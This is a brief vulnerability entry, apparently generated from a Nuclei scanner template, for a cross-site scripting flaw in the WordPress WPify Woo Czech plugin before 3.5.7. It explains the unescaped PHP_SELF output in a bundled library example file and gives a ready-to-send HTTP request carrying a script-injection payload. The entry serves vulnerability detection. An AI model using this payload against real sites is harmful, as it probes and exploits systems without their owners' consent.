# Vulnerability: WordPress WPify Woo Czech <3.5.7 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wpify-woo-czech-xss.yaml`)

## Description
WordPress WPify Woo Czech plugin before 3.5.7 contains a cross-site scripting vulnerability. The plugin uses the Vies library 2.2.0, which has a sample file outputting $_SERVER['PHP_SELF'] in an attribute without being escaped first. The issue is only exploitable when the web server has the PDO driver installed and write access to the example directory.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/"><script>alert(document.domain)</script>
```

